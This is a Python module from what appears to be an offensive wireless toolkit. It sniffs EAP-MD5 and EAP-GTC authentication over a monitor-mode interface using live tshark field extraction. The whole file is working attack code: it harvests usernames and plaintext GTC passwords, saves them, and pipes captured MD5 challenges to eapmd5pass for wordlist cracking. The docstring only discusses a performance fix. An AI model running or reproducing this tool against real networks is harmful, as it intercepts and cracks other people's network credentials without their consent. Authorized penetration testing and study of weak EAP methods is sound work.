"""EAP-MD5 / EAP-GTC plaintext/hash sniffing from wireless traffic.

PERFORMANCE FIX: the previous version polled every 2s by spawning two new
`tshark -r <pcap>` subprocesses, each re-parsing the ENTIRE capture file
from byte zero — cost grew without bound as the session got longer.

Now a single long-running tshark process does live field extraction
(`-T fields` combined with `-w`, which tshark supports simultaneously —
it writes the pcap AND prints decoded fields to stdout as packets arrive).
Lines are read and parsed as they're emitted; nothing is ever re-read.
"""

import asyncio
import os
from pathlib import Path

from core.exec_utils import run_command, validate_channel
from core.hardware import start_monitor_mode, stop_monitor_mode, track_process
from core.models import save_result
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")


async def run_eap_sniff(interface: str, channel: str = "", wordlist: str = "") -> None:
    header("EAP-MD5 / EAP-GTC Credential Sniffing")
    if channel and not validate_channel(channel):
        err("Invalid channel"); return
    if wordlist and not os.path.isfile(wordlist):
        err(f"Wordlist not found: {wordlist!r}"); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    mon_iface = await start_monitor_mode(interface)
    ok(f"Monitor mode active on {mon_iface}")

    if channel:
        await run_command(["sudo", "iw", "dev", mon_iface, "set", "channel", channel])

    pcap_file = CAPTURE_DIR / f"eap_sniff_{mon_iface}.pcap"

    # Single streaming tshark process: writes the pcap (for eapmd5pass
    # post-processing) AND prints decoded fields live as frames arrive.
    # -l forces line-buffered stdout so readline() doesn't block on tshark's
    # internal buffering.
    tshark_cmd = [
        "sudo", "tshark", "-i", mon_iface,
        "-f", "ether proto 0x888e",
        "-w", str(pcap_file),
        "-T", "fields", "-l",
        "-e", "eap.type", "-e", "wlan.sa", "-e", "eap.identity",
        "-e", "eap.md5_challenge", "-e", "eap.md5_response", "-e", "eap.gtc_value",
    ]
    tshark_proc = await asyncio.create_subprocess_exec(
        *tshark_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    track_process(tshark_proc)

    captured_md5, captured_gtc = [], []
    seen_md5_users, seen_gtc_users = set(), set()

    async def stream_reader():
        while True:
            line = await tshark_proc.stdout.readline()
            if not line:
                break
            decoded = line.decode(errors="replace").strip()
            if not decoded:
                continue
            parts = decoded.split("\t")
            if len(parts) < 3:
                continue
            eap_type, sa, identity = parts[0], parts[1], parts[2]
            challenge = parts[3] if len(parts) > 3 else ""
            response = parts[4] if len(parts) > 4 else ""
            gtc_value = parts[5] if len(parts) > 5 else ""

            if eap_type == "4" and identity and challenge and response:
                if identity not in seen_md5_users:
                    seen_md5_users.add(identity)
                    captured_md5.append({"username": identity, "challenge": challenge, "response": response})
                    console.print(f"  [yellow]EAP-MD5[/yellow] {identity}  challenge={challenge[:16]}...")

            elif eap_type == "6" and identity and gtc_value:
                if identity not in seen_gtc_users:
                    seen_gtc_users.add(identity)
                    captured_gtc.append({"username": identity, "password": gtc_value})
                    ok(f"EAP-GTC PLAINTEXT: {identity} : {gtc_value}")
                    save_result(f"gtc_{len(captured_gtc)}", "eap_sniff", "", "", f"{identity}:{gtc_value}")

    reader_task = asyncio.create_task(stream_reader())

    info("Listening for EAPOL frames (Ctrl+C to stop)...")
    try:
        with StatusLine("Listening...") as status:
            while True:
                status.update(f"{len(captured_md5)} MD5 / {len(captured_gtc)} GTC captured")
                await asyncio.sleep(1)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopped by user.")
    finally:
        reader_task.cancel()
        if tshark_proc.returncode is None:
            tshark_proc.terminate()
            try:
                await tshark_proc.wait()
            except Exception:
                pass
        await stop_monitor_mode(mon_iface)

    if captured_md5 and wordlist:
        info(f"Attempting eapmd5pass crack on {len(captured_md5)} MD5 challenge(s)...")
        try:
            result = await run_command(["eapmd5pass", "-r", str(pcap_file), "-w", wordlist])
            for line in result.splitlines():
                if "Password:" in line:
                    console.print(f"  [bold green]{line}[/bold green]")
        except Exception as e:
            warn(f"eapmd5pass failed: {e}")

    ok(f"Session complete — {len(captured_md5)} EAP-MD5, {len(captured_gtc)} EAP-GTC captured.")
